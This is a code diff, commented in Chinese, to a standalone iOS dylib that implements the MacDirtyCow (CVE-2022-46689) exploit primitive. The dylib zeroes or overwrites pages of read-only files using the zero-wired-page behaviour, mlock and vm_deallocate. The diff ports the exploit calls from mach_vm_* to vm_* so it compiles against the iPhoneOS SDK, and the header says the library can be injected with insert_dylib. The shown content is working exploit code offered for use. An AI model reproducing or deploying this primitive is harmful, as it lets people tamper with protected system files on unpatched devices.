@@ -4,6 +4,10 @@
  * 自包含的 MacDirtyCow (CVE-2022-46689) 文件页操作原语，
  * 编译为独立 dylib，可由 App dlopen 调用或经 insert_dylib 注入。
  *
+ * 注意：iPhoneOS SDK 不提供 mach/mach_vm.h，因此这里使用公开的
+ * vm_behavior_set / vm_deallocate（arm64 上 vm_address_t/vm_size_t
+ * 本身就是 64 位，与 mach_vm_* 变体等价）。
+ *
  * 导出接口：
  *   const char *mdcx_core_version(void);
  *   int         mdcx_zero_file(const char *path);                 // 清零首页
@@ -25,11 +29,9 @@
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <mach/mach.h>
-#include <mach/mach_vm.h>
+#include <mach/vm_map.h>
 
 #define MDCX_CORE_VERSION "2.3.0"
-
-/* mach_vm_behavior_set / mach_vm_deallocate 的原型由 <mach/mach_vm.h> 提供 */
 
 __attribute__((visibility("default")))
 const char *mdcx_core_version(void) {
@@ -37,22 +39,22 @@ const char *mdcx_core_version(void) {
 }
 
 /* 单页清零：zero-wired-page 行为 + mlock + 拆除映射，迫使零页回写 */
-static int mdcx_zero_page(mach_vm_address_t page, mach_vm_size_t page_size) {
+static int mdcx_zero_page(vm_address_t page, vm_size_t page_size) {
     kern_return_t kr;
 
-    kr = mach_vm_behavior_set(mach_task_self(), page, page_size,
-                              VM_BEHAVIOR_ZERO_WIRED_PAGES);
+    kr = vm_behavior_set(mach_task_self(), page, page_size,
+                         VM_BEHAVIOR_ZERO_WIRED_PAGES);
     if (kr != KERN_SUCCESS) return 3;
 
     if (mlock((void *)page, (size_t)page_size) != 0) {
-        mach_vm_behavior_set(mach_task_self(), page, page_size, VM_BEHAVIOR_DEFAULT);
+        vm_behavior_set(mach_task_self(), page, page_size, VM_BEHAVIOR_DEFAULT);
         return 4;
     }
 
-    kr = mach_vm_deallocate(mach_task_self(), page, page_size);
+    kr = vm_deallocate(mach_task_self(), page, page_size);
     if (kr != KERN_SUCCESS) {
         munlock((void *)page, (size_t)page_size);
-        mach_vm_behavior_set(mach_task_self(), page, page_size, VM_BEHAVIOR_DEFAULT);
+        vm_behavior_set(mach_task_self(), page, page_size, VM_BEHAVIOR_DEFAULT);
         return 5;
     }
     return 0;
@@ -87,8 +89,8 @@ int mdcx_zero_file_pages(const char *path, int all_pages) {
 
     rc = 0;
     for (i = 0; i < pages; i++) {
-        mach_vm_address_t page = (mach_vm_address_t)map + (mach_vm_size_t)i * (mach_vm_size_t)page_size;
-        rc = mdcx_zero_page(page, (mach_vm_size_t)page_size);
+        vm_address_t page = (vm_address_t)map + (vm_size_t)i * (vm_size_t)page_size;
+        rc = mdcx_zero_page(page, (vm_size_t)page_size);
         if (rc != 0) break;
     }
 
@@ -132,12 +134,12 @@ int mdcx_overwrite_file(const char *path, const unsigned char *data, unsigned in
 
     pages = (int)(map_len / (size_t)page_size);
     for (i = 0; i < pages; i++) {
-        mach_vm_address_t page = (mach_vm_address_t)map + (mach_vm_size_t)i * (mach_vm_size_t)page_size;
+        vm_address_t page = (vm_address_t)map + (vm_size_t)i * (vm_size_t)page_size;
         kern_return_t kr;
         if (mlock((void *)page, (size_t)page_size) != 0) {
             munmap(map, map_len); close(fd); return 4;
         }
-        kr = mach_vm_deallocate(mach_task_self(), page, (mach_vm_size_t)page_size);
+        kr = vm_deallocate(mach_task_self(), page, (vm_size_t)page_size);
         if (kr != KERN_SUCCESS) {
             munlock((void *)page, (size_t)page_size);
             munmap(map, map_len); close(fd); return 5;
